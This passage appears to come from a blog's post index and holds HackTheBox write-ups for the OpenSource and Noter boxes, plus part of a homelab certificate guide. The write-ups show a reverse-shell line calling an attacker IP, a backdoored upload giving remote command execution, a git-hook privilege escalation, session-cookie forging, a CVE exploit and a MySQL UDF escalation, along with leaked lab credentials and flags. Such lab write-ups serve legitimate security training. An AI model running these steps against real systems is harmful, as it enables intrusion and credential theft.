2.0)| ssh-hostkey: | 2048 1e:59:05:7c:a9:58:c9:23:90:0f:75:23:82:3d:05:5f (RSA)| 256 48:a8:53:e7:e0:08:aa:1d:96:86:52:bb:88:56:a0:b7 (ECDSA)|_ 256 02:1f:97:9e:3c:8e:7a:1c:7c:af:9d:5a:25:4b:b8:c8 (ED25519)80/tcp open http Werkzeug/2.1.2 Python/3.10.3| fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK| Server: Werkzeug/2.1.2 Python/3.10.3| Date: Mon, 30 May 2022 11:11:31 GMT| Content-Type: text/html; charset=utf-8| Content-Length: 1360| Connection: close| &lt;html lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"UTF-8\"&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;| &lt;title&gt;upcloud - Upload files for Free!&lt;/title&gt;| &lt;script src=\"/static/vendor/jquery/jquery-3.4.1.min.js\"&gt;&lt;/script&gt;| &lt;script src=\"/static/vendor/popper/popper.min.js\"&gt;&lt;/script&gt;| &lt;script src=\"/static/vendor/bootstrap/js/bootstrap.min.js\"&gt;&lt;/script&gt;| &lt;script src=\"/static/js/ie10-viewport-bug-workaround.js\"&gt;&lt;/script&gt;| &lt;link rel=\"stylesheet\" href=\"/static/vendor/bootstrap/css/bootstrap.css\"/&gt;| &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-grid.css\"/&gt;| &lt;link rel=\"stylesheet\" href=\" /static/vendor/bootstrap/css/bootstrap-reboot.css\"/&gt;| &lt;link rel=\"| HTTPOptions: | HTTP/1.1 200 OK| Server: Werkzeug/2.1.2 Python/3.10.3| Date: Mon, 30 May 2022 11:11:31 GMT| Content-Type: text/html; charset=utf-8| Allow: OPTIONS, HEAD, GET, POST| Content-Length: 0| Connection: close| RTSPRequest: | &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"| \"http://www.w3.org/TR/html4/strict.dtd\"&gt;| &lt;html&gt;| &lt;head&gt;| &lt;meta http-equiv=\"Content-Type\" content=\"text/html;charset=utf-8\"&gt;| &lt;title&gt;Error response&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;Error response&lt;/h1&gt;| &lt;p&gt;Error code: 400&lt;/p&gt;| &lt;p&gt;Message: Bad request version ('RTSP/1.0').&lt;/p&gt;| &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;| &lt;/body&gt;|_ &lt;/html&gt;|_http-title: upcloud - Upload files for Free!|_http-server-header: Werkzeug/2.1.2 Python/3.10.33000/tcp filtered ppp1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port80-TCP:V=7.92%I=7%D=5/30%Time=6294A663%P=x86_64-pc-linux-gnu%r(GetRSF:equest,5FF,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nServer:\\x20Werkzeug/2\\.1\\.2\\x20PySF:thon/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2030\\x20May\\x202022\\x2011:11:31\\x20GMT\\SF:r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x201SF:360\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n\\x20\\SF:x20\\x20\\x20&lt;meta\\x20charset=\\\"UTF-8\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20name=\\SF:\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=1\\.0\\\"&gt;\\nSF:\\x20\\x20\\x20\\x20&lt;title&gt;upcloud\\x20-\\x20Upload\\x20files\\x20for\\x20Free!&lt;SF:/title&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\\"/static/vendor/jquery/jquerSF:y-3\\.4\\.1\\.min\\.js\\\"&gt;&lt;/script&gt;\\n\\x20\\x20\\x20\\x20&lt;script\\x20src=\\\"/statiSF:c/vendor/popper/popper\\.min\\.js\\\"&gt;&lt;/script&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;script\\SF:x20src=\\\"/static/vendor/bootstrap/js/bootstrap\\.min\\.js\\\"&gt;&lt;/script&gt;\\n\\xSF:20\\x20\\x20\\x20&lt;script\\x20src=\\\"/static/js/ie10-viewport-bug-workaround\\SF:.js\\\"&gt;&lt;/script&gt;\\n\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=SF:\\\"/static/vendor/bootstrap/css/bootstrap\\.css\\\"/&gt;\\n\\x20\\x20\\x20\\x20&lt;linSF:k\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"\\x20/static/vendor/bootstrap/css/bootSF:strap-grid\\.css\\\"/&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20hreSF:f=\\\"\\x20/static/vendor/bootstrap/css/bootstrap-reboot\\.css\\\"/&gt;\\n\\x20\\x2SF:0\\x20\\x20&lt;link\\x20rel=\\\"\")%r(HTTPOptions,CD,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nSF:Server:\\x20Werkzeug/2\\.1\\.2\\x20Python/3\\.10\\.3\\r\\nDate:\\x20Mon,\\x2030\\xSF:20May\\x202022\\x2011:11:31\\x20GMT\\r\\nContent-Type:\\x20text/html;\\x20charSF:set=utf-8\\r\\nAllow:\\x20OPTIONS,\\x20HEAD,\\x20GET,\\x20POST\\r\\nContent-LenSF:gth:\\x200\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(RTSPRequest,1F4,\"&lt;!DOCTYPSF:E\\x20HTML\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x204\\.01//EN\\\"\\n\\x20\\x20\\xSF:20\\x20\\x20\\x20\\x20\\x20\\\"http://www\\.w3\\.org/TR/html4/strict\\.dtd\\\"&gt;\\n&lt;hSF:tml&gt;\\n\\x20\\x20\\x20\\x20&lt;head&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;meta\\x20SF:http-equiv=\\\"Content-Type\\\"\\x20content=\\\"text/html;charset=utf-8\\\"&gt;\\n\\xSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;title&gt;Error\\x20response&lt;/title&gt;\\n\\x20\\x2SF:0\\x20\\x20&lt;/head&gt;\\n\\x20\\x20\\x20\\x20&lt;body&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\SF:x20&lt;h1&gt;Error\\x20response&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;ErrorSF:\\x20code:\\x20400&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&lt;p&gt;Message:\\x20BaSF:d\\x20request\\x20version\\x20\\('RTSP/1\\.0'\\)\\.&lt;/p&gt;\\n\\x20\\x20\\x20\\x20\\x20\\SF:x20\\x20\\x20&lt;p&gt;Error\\x20code\\x20explanation:\\x20HTTPStatus\\.BAD_REQUEST\\SF:x20-\\x20Bad\\x20request\\x20syntax\\x20or\\x20unsupported\\x20method\\.&lt;/p&gt;\\nSF:\\x20\\x20\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 100.60 seconds┌─[jayden@JD-Desktop]─[~/ctf/openssource]└──╼ $Lets checkout port 80. We are presented with a normal webpage, which describes an opensource file sharing web program, which allows us to download the source by clicking the blue \"Download\" buttonFurther down on the homepage, it allows you to try this out on this externally hosted platform.After uploading a file, we are presented with a download link to the recently just uploaded file.Let's look through the source code and see if we can find anything that sticks out.First thing to take note, is that there is a .git directory present, first need to check if there's any clues in the git log.┌─[✗]─[jayden@JD-Desktop]─[~/ctf/openssource/source]└──╼ $git branch dev* public┌─[jayden@JD-Desktop]─[~/ctf/openssource/source]└──╼ $git logcommit 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 (HEAD -&gt; public)Author: gituser &lt;gituser@local&gt;Date: Thu Apr 28 13:55:55 2022 +0200 clean up dockerfile for production usecommit ee9d9f1ef9156c787d53074493e39ae364cd1e05Author: gituser &lt;gituser@local&gt;Date: Thu Apr 28 13:45:17 2022 +0200 initial┌─[✗]─[jayden@JD-Desktop]─[~/ctf/openssource/source]└──╼ $git logcommit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -&gt; dev)Author: gituser &lt;gituser@local&gt;Date: Thu Apr 28 13:47:24 2022 +0200 ease testingcommit be4da71987bbbc8fae7c961fb2de01ebd0be1997Author: gituser &lt;gituser@local&gt;Date: Thu Apr 28 13:46:54 2022 +0200 added gitignorecommit a76f8f75f7a4a12b706b0cf9c983796fa1985820Author: gituser &lt;gituser@local&gt;Date: Thu Apr 28 13:46:16 2022 +0200┌─[jayden@JD-Desktop]─[~/ctf/openssource/source]└──╼ $git checkout devSwitched to branch 'dev' updatedcommit ee9d9f1ef9156c787d53074493e39ae364cd1e05Author: gituser &lt;gituser@local&gt;Date: Thu Apr 28 13:45:17 2022 +0200 initial┌─[jayden@JD-Desktop]─[~/ctf/openssource/source]└──╼ $git diff c41fedef2ec6df98735c11b2faf1e79ef492a0f3 a76f8f75f7a4a12b706b0cf9c983796fa1985820 | tailnew file mode 100644index 0000000..5975e3f--- /dev/null+++ b/app/.vscode/settings.json@@ -0,0 +1,5 @@+{+ \"python.pythonPath\": \"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python\",+ \"http.proxy\": \"http://&lt;strong&gt;dev01:Soulless_Developer#2022&lt;/strong&gt;@10.10.10.128:5187/\",+ \"http.proxyStrictSSL\": false+}Looks like we have a username and password that was used. We will note those creds down for later.Now lets checkout the source code ourselves, and see if we can find any bugs/exploits. Before we check the code out, let's find out what branch the active instance is running.The difference between the dev and public branch, is that the \"dev\" branch you POST and GET files from the /upcloud URI, while on the \"public\" branch it is just the / (root) URI. From this we can determine that the active branch is actually \"dev\".Checking the upload part of the app, `views.py`, we can see how it manages files.@app.route('/upcloud', methods=['GET', 'POST'])def upload_file(): if request.method == 'POST': f = request.files['file'] file_name = get_file_name(f.filename) file_path = &lt;strong&gt;os.path.join&lt;/strong&gt;(os.getcwd(), \"public\", \"uploads\", file_name) f.save(file_path) return render_template('success.html', file_url=request.host_url + \"uploads/\" + file_name) return render_template('upload.html')@app.route('/uploads/&lt;path:path&gt;')def send_report(path): path = get_file_name(path) return send_file(&lt;strong&gt;os.path.join&lt;/strong&gt;(os.getcwd(), \"public\", \"uploads\", path))What's wrong with this code? The issue is with \"os.path.join\". Reading the docs of os.path.join, we can see that if any of the parameters are an absolute path, all other parameters are thrown away. If we are able to set the path as an absolute path (EX: /app/app.py) we should be able to get a file.PROBLEMWhen attempting to use an absolute path on the /uploads/ endpoint, the Werkzueg app normalises the path, so /uploads//etc/passwd, just gets normalised to /uploads/etc/passwd. The other avenue is we could upload a file with the filename of an absolute path.Checking the Dockerfile, we can see the location of where the app would be running, then using this short script I wrote, upload.py this will POST this views.py file, with a filename of \"/app/app.py\". This gives us 2 new routes, /jayden/&lt;file name&gt;, which will allow us to download any file from the host, then also the route /jayden_cmd/&lt;command&gt;, which will allow us to have RCE on this box. The short upload.py script I wrote will then give us a rudimentary shell on the box.Now that we have access to this host, we can just escalate to a proper shell, CMD&gt; nc 10.10.14.44 4000 -e /bin/sh/app $ whoamiroot/app $ hostname6d796f9974e9/app $ cat /.dockerenv /app $ &lt;/code&gt;&lt;/pre&gt;And we can then see that this is a Docker host. Now that we have access we can check for port 3000, on what service is actually running there. /app # wget 10.10.11.164:3000Connecting to 10.10.11.164:3000 (10.10.11.164:3000)saving to 'index.html'index.html 100% |********************************| 13414 0:00:00 ETA'index.html' saved/app # cat index.html | head&lt;!DOCTYPE html&gt;&lt;html lang=\"en-US\" class=\"theme-\"&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;title&gt; Gitea: Git with a cup of tea&lt;/title&gt; &lt;link rel=\"manifest\" href=\"data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL29wZW5zb3VyY2UuaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9vcGVuc291cmNlLmh0YjozMDAwL2Fzc2V0cy9pbWcvbG9nby5wbmciLCJ0eXBlIjoiaW1hZ2UvcG5nIiwic2l6ZXMiOiI1MTJ4NTEyIn0seyJzcmMiOiJodHRwOi8vb3BlbnNvdXJjZS5odGI6MzAwMC9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19\"/&gt; &lt;meta name=\"theme-color\" content=\"#6cc644\"&gt; &lt;meta name=\"default-theme\" content=\"auto\" /&gt; &lt;meta name=\"author\" content=\"Gitea - Git with a cup of tea\" /&gt;/app # It's running what looks like Gitea that's listening on 127.0.0.1:3000. To access this properly from our attacking machine, we can look into Chisel to relay the traffic so we can actually browse this Gitea instance. First just have to copy the binaries across, which is easy with wget and a local http server on our attacking machine. Once across we have to do the below to proxy the traffic.Attacking Machine:sudo chisel server --port 3000 -v --reverse --socks5Client Machine:./chisel client 10.10.14.44:3000 R:5000:socksNeed to then enable Firefox to use the Chisel SOCKS proxy, on localhost on port 5000. We can now see Gitea instance. Now let's try and login with the credentials from the proxy we saw in the git diff.After successful login, we can see some backup files, and inside the .ssh folder, we find a private key. Pull this private key down to your local machine. ┌─[jayden@JD-Desktop]─[~/ctf/openssource]└──╼ $cat id_rsa | head-----BEGIN RSA PRIVATE KEY-----MIIJKQIBAAKCAgEAqdAaA6cYgiwKTg/6SENSbTBgvQWS6UKZdjrTGzmGSGZKoZ0lxfb28RAiN7+yfT43HdnsDNJPyo3U1YRqnC83JUJcZ9eImcdtX4fFIEfZ8OUouu6Ru2TPqjGvyVZDj3OLRMmNTR/OUmzQjpNIGyrIjDdvm1/Hkky/CfyXUucFnshJr/BLNow let's sign in to the host with this new private key. We now have user access, and can get the user flag.User owned!┌─[jayden@JD-Desktop]─[~/ctf/openssource]└──╼ $ssh -i id_rsa dev01@10.10.11.164Last login: Mon May 16 13:13:33 2022 from 10.10.14.23dev01@opensource:~$ cat user.txt 50a9b7e797ac653c0eff40cff4e7262ddev01@opensource:~$ Now for root, lets do basic enumeration, with linPEAS, and also pspylinPEAS gave us no quick and easy Priv Esc, but with pspy, we can see that a script under the root user is called that calls git in the dev01 users home directory.2022/05/31 10:43:01 CMD: UID=0 PID=10614 | /bin/bash /usr/local/bin/git-sync 2022/05/31 10:43:01 CMD: UID=0 PID=10613 | /bin/sh -c /usr/local/bin/git-sync 2022/05/31 10:43:01 CMD: UID=0 PID=10612 | /usr/sbin/CRON -f 2022/05/31 10:43:01 CMD: UID=0 PID=10615 | git status --porcelain 2022/05/31 10:43:01 CMD: UID=0 PID=10617 | git add . 2022/05/31 10:43:01 CMD: UID=0 PID=10620 | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 2022/05/31 10:53:01 CMD: UID=0 PID=4095 | git commit -m Backup for 2022-05-31 2022/05/31 10:43:01 CMD: UID=0 PID=10619 | git push origin main dev01@opensource:~$ cat /usr/local/bin/git-sync#!/bin/bashcd /home/dev01/if ! git status --porcelain; then echo \"No changes\"else day=$(date +'%Y-%m-%d') echo \"Changes detected, pushing..\" git add . git commit -m \"Backup for ${day}\" git push origin mainfiThis looks to be the way to get the root flag. How would we get this from a root script calling git? We can look at Git Hooks. We can create a pre-commit hook, that code will then be executed before git commit is even ran. Let's create our own quick script that copies the flag to /tmp. (We could create a reverse shell and then have a full shell running as root, but went the quicker route)dev01@opensource:~$ vi /home/dev01/.git/hooks/pre-commit#!/bin/bashcp /root/root.txt /tmp/tmp.txtchmod 777 /tmp/tmp.txtWatch using the pspy binary for the next cronjob of this to run, and then check /tmp/tmp.txt to find the flagdev01@opensource:/tmp$ cat /tmp/tmp.txt 1e98fe0be2c9197fa6c1fcb965f82b5adev01@opensource:/tmp$ Root owned!" }, { "title": "HackTheBox - Noter Walkthrough", "url": "/posts/htb-noter/", "categories": "", "tags": "security, hackthebox, ctf", "date": "2022-05-20 00:00:00 +1000", "snippet": "Noter was an interesting box, user was easy to get, required enumerating extensively.ScanningStart off with a nmap$ nmap -sV -p- -oA 10.10.11.160 10.10.11.160Nmap scan report for 10.10.11.160Host i...", "content": "Noter was an interesting box, user was easy to get, required enumerating extensively.ScanningStart off with a nmap$ nmap -sV -p- -oA 10.10.11.160 10.10.11.160Nmap scan report for 10.10.11.160Host is up (0.015s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelThere is 3 ports open, SSH, FTP and a webserver running on port 5000. Let's access the web server on port 5000 from a web browser and see what we can find.http://10.10.11.160:5000Trying the default credentials on http://10.10.11.160:5000/login resulted in no success.admin:adminadmin:passwordadmin:administrator:passwordIt does however let us register, so lets try that.After registering with junk credentials, we are now able to login.Upon logging in, we have a valid session with a cookie, let's checkout if after logging in we can see any more directories, and see if we can find any other useful files.$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -u http://10.129.173.105:5000/FUZZ -H \"Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.YonraA.yW130NmEJTMGWTMRAaJeW5JTL8c\"register [Status: 200, Size: 2646, Words: 523, Lines: 95, Duration: 247ms]login [Status: 200, Size: 1967, Words: 427, Lines: 67, Duration: 277ms]logout [Status: 302, Size: 218, Words: 21, Lines: 4, Duration: 234ms]dashboard [Status: 200, Size: 2361, Words: 560, Lines: 83, Duration: 220ms]notes [Status: 200, Size: 1703, Words: 388, Lines: 61, Duration: 224ms]VIP [Status: 200, Size: 1742, Words: 398, Lines: 58, Duration: 225ms]These pages are already navigatable from just being logged in, so there is nothing new here.Inspecting the session cookie, it has the format like below. This cookie format looks like a JWT, lets try it out on https://jwt.io to validate if it is a valid JWT.eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.YonraA.yW130NmEJTMGWTMRAaJeW5JTL8cIt's not a valid JWT, but it almost follows the same format, with the string before the first \".\" being base64 encoded. Looking back at what the service was identified on port 5000, being **Werkzeug**, lets search what cookie types can be generated by WerkZeug. We find Secure Cookie. After playing with this, the output is not the correct cookie type. After finding Flask Session Cookie Decoder and entering our session cookie, we can conclude that the cookie type is used by flask. This cookie is signed with a secret key that is stored in the app.config class. If we were able to brute force the secret key, we could then forge our own cookie with any username and get access to other users notes.Using flask-unsign, we are able to brute force the \"secret\" key.$ flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiamF5ZGVuIn0.Yn0P8Q.XaXAKhvjJ6uPpxdUw1V0KPitAW8'[*] Session decodes to: {'logged_in': True, 'username': 'jayden'}[*] No wordlist selected, falling back to default wordlist..[*] Starting brute-forcer with 8 threads..[*] Attempted (2048): -----BEGIN PRIVATE KEY-----***[+] Found secret key after 16768 attempts-FF35-D147FB'secret123'Then confirmed that this was the secret key for signing cookies, by generating my own cookie again and then confirming still able to login.$ flask-unsign --sign --cookie \"{'logged_in': True, 'username' :'admin'}\" --secret secret123eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYWRtaW4ifQ.YoIo2Q.spOR6sUSMWZOX5_xKq9iiwkfTFkWith this we can now start brute forcing usernames to try find valid usernames.To make this brute forcing easier, I wrote this quick Flask API that generates a cookie and returns the cookie in GET response body.cookie_flask.py - This creates an API endpoint on port 5000.login.py - This uses the above cookie_flask.py to grab a cookie, then attempt to load the dashboard with that cookie.┌─[jayden@JD-Desktop]─[~/ctf/noter]└──╼ $python login.py blueblue is a valid username, using the same cookie_flask.py we can generate our own cookie and use this to find notes under the \"blue\" user.┌─[✗]─[jayden@JD-Desktop]─[~/ctf/noter]└──╼ $curl http://localhost:5000/?username=blueeyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YooFiQ.DaITx8UmoSeXCp3mlh6W8iFO5W4If we look at notes for the \"blue\" user, http://10.10.11.160:5000/note/1/, we can see this note.Written by ftp_admin on Mon Dec 20 01:52:32 2021 Hello, Thank you for choosing our premium service. Now you are capable ofdoing many more things with our application. All the information you are goingto need are on the Email we sent you. By the way, now you can access our FTPservice as well. Your username is 'blue' and the password is 'blue@Noter!'.Make sure to remember them and delete this. (Additional information are included in the attachments we sent along theEmail) We all hope you enjoy our service. Thanks! ftp_adminWe are now able to login to the FTP server with the blue user.┌─[jayden@JD-Desktop]─[~/ctf/noter]└──╼ $ftp 10.10.11.160Connected to 10.10.11.160.220 (vsFTPd 3.0.3)Name (10.10.11.160:jayden): blue331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 2 1002 1002 4096 May 02 23:05 files-rw-r--r-- 1 1002 1002 12569 Dec 24 20:59 policy.pdf226 Directory send OK.ftp&gt; After downloading policy.pdf, it tells us the password policies for the organisation. Under \"Password Creation\" line 4, it indicates1. Default user-password generated by the application is in the format of \"username@site_name!\" (This applies to all your applications)The other username we got was from the note, \"ftp_admin\". This would make the default ftp_admin password \"ftp_admin@Noter!\" lets try this on the FTP server.┌─[jayden@JD-Desktop]─[~/ctf/noter]└──╼ $ftp 10.10.11.160Connected to 10.10.11.160.220 (vsFTPd 3.0.3)Name (10.10.11.160:jayden): ftp_admin331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip-rw-r--r-- 1 1003 1003 26298 Dec 01 05:52 app_backup_1638395546.zip226 Directory send OK.ftp&gt; Sure enough it works! Lets download these zips, as they look to be the source code for this server. Under the app_backup_1635803546.zip/app.py we can see the MySQL credentials hardcoded into the file, note these for later.┌─[jayden@JD-Desktop]─[~/ctf/noter/zip/1635]└──╼ $cat app.py | grep -i mysqlfrom flask_mysqldb import MySQL# Config MySQLapp.config['MYSQL_HOST'] = 'localhost'app.config['MYSQL_USER'] = 'root'app.config['MYSQL_PASSWORD'] = 'Nildogg36'app.config['MYSQL_DB'] = 'app'app.config['MYSQL_CURSORCLASS'] = 'DictCursor'Browsing through app_backup_1638395546.zip source code we find that the export markdown to PDF and import markdown to PDF feature is implemented. It uses the library md-to-pdf to achieve this feature. Searching CVE's for md-to-pdf leads us to CVE-2021-23639, which allows us to have RCE. To exploit this, we need to use the \"Export directly from cloud\" feature of the VIP section. This is only visible while logged in as the \"blue\" user, as regular users do not have \"VIP\".To successfully get RCE, we need the \"Export directly from cloud\" feature to point to a markdown file that we control. This is easy to achieve by running simple webserver on port 80, and pointing the \"Export directly from cloud\" feature to our local machine, http://VPN_IP:5000/test.md .I created the paylod and bash reverse shell script files below and 2 commands, we can chain these to get a reverse shell.test.mdreverse.shStart Python webserver$ nc -nvlp 4444$ sudo python -m http.server 80Start netcat listener on port 4444┌─[jayden@JD-Desktop]─[~/ctf/noter/zip/1635]└──╼ $nc -nvlp 4444Listening on 0.0.0.0 4444Connection received on 10.10.11.160 49974whoamisvcpwd/home/svc/app/weblsapp.pymisctemplatescat /home/svc/user.txt&lt;strong&gt;eda1d835fa77d477bded5bdda7491a44&lt;/strong&gt;We have succesfully got the user flag!RootUpgrade netcat shell to a fully interactive TTY shell to make life easier.$ python -c 'import pty; pty.spawn(\"/bin/bash\")'Ctrl + Z$ stty raw -echo$ fgAfter enumerating all services on the box, there is nothing that sticks out. We still have the root credentials for MySQL. Looking at privilege escalation techniques in MySQL leads us to Privilege Escalation via library.Download and copy the UDF library to the box, and compile it (I put it in the home directory)['MYSQL_USER'] = 'root' ['MYSQL_PASSWORD'] = 'Nildogg36'svc@noter:~$ mysql -u root -pEnter password: MariaDB [(none)]&gt; use mysql;MariaDB [mysql]&gt; create table npn(line blob);MariaDB [mysql]&gt; insert into npn values(load_file('/home/svc/raptor_udf2.so'));MariaDB [mysql]&gt; select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';MariaDB [mysql]&gt; create function do_system returns integer soname 'raptor_udf2.so';MariaDB [mysql]&gt; select * from mysql.func;MariaDB [mysql]&gt; select do_system(\"cat /root/root.txt &gt; /tmp/root.txt ; chmod 777 /tmp/root.txt\");MariaDB [mysql]&gt; exitByesvc@noter:/tmp$ cat root.txt &lt;strong&gt;6cc87060b916eefafa8f32950f09248f&lt;/strong&gt;svc@noter:/tmp$ root successfully obtained!" }, { "title": "Creating Certificate for EdgeMAX device", "url": "/posts/cert-edgemax/", "categories": "", "tags": "homelab", "date": "2020-04-21 00:00:00 +1000", "snippet": "Creating an internal CA (certificate authority), has saved the annoyance of having to click \"Proceed Anyway\" through Chrome or Internet Explorer every time I open up a HTTPS enabled web interface f...", "content": "Creating an internal CA (certificate authority), has saved the annoyance of having to click \"Proceed Anyway\" through Chrome or Internet Explorer every time I open up a HTTPS enabled web interface for one of my devices. It also has enabled me to learn more about certificate process.Today I'm going to create a SSL certificate signed by my internal CA (linds-CA) that will allow all my domain joined computers (and all other devices that have trusted my CA) to be able to access these devices without an issue, as well as adding an extra layer of security.First I will need to create a CSR (Certificate Signing Request) from my EdgeMAX device.I can do this by using OpenSSL on the device. An easy way to get the command needed to create this, is using a generator like so. I ran into issues doing this, as the OpenSSL request with the generator, doesn't include any subject alternative names, or SAN.Instead I created the request from my desktop, using a Custom Request...TAKE NOTE: Where you requested it from, I requested it from my PC, under Local Computer -&gt; Personal -&gt; CertificatesI chose to use my Active Directory Enrollment Policy, and chose my Web Server template to speed things up. Once you are onto Certificate Information, click properties and enter the details that are relevant to youIn Extensions tab, under Extended Key Usage, Select Client Authentication option, as well as in the Private Key tab, under Key options, make sure \"Make private key exportable\" is selected. Once done, click OK, and then click NextSave the file somewhere safe.With this file, I can submit it directly to the CA through MMC, or I can submit it through Certificate Authority Web Enrollment.I'm going to do this through my CA Web Enrollment, as it's quicker.Head to your web enrollment page, and select \"Request a certificate\"Then click \"Or, submit an advanced certificate request\"Copy and paste the contents of the CSR or output of using cat on the file into the Saved Request: textbox. Choose a Certificate Template of Web Server, and click submit.You will need to approve this request, which can be done by opening up the Certificate Authority console, expanding your CA server, and then going to Pending certificates. Right click your request, All Tasks -&gt; IssueOpen Issued Certificates under your CA server, find your newly issued certificate, double click and head to the Details tab. Click \"Copy to File...\"Click Next, select \"Base-64 encoded X.509 (.CER)\". Store this file somewhere easy to access.Install this certificate in the same location that you requested it on the computer you requested it from. For example back into my local PC Certificates -&gt; Personal -&gt; Certificates. Open the certificate up through the console, and you will now see that you have the Private Key with that certificate.We now need to extract this Private Key and combine it with the certificate to use on our EdgeMAX device.Go to the Details Tab of your certificate, click \"Copy to File...\", click Next, select Yes, export the private key, click Next. Click Next again and you will be forced to include a password. Use a password you can remember. Click Next, and save to a location that is safe.Jump back to the SSH console, and copy across your newly exported .pfx and the CA certificate through SSH to a folder, such as /config/auth.We now need to extract the .key and .crt, we can do this using OpenSSL on the EdgeMAX. While still in the SSH session use the command below, it will ask you to enter the password you used above, as the Import Password.It will now ask you for a password to protect the .key file, enter another password and keep that one safeopenssl pkcs12 -in ubnt.pfx -nocerts -out ubnt.keyI now have the private key by itself encrypted by the passphrase I just gave it. Run the below command (with your file names) to decrypt the private key.openssl rsa -in ubnt.key -out ubnt-decrypted.keyNow we need to extract the actual certificate that goes along with that private key, and we can achieve this, by running the below commandopenssl pkcs12 -in ubnt.pfx -clcerts -nokeys - out ubnt.crtIf we cat ubnt.crt, we are presented with the belowBag AttributeslocalKeyID: 01 00 00 00friendlyName: LINDS-ERXsubject=/C=AU/ST=VIC/L=Langy/O=LINDS/CN=linds-erxissuer=/DC=au/DC=com/DC=linds/CN=linds-CA-----BEGIN 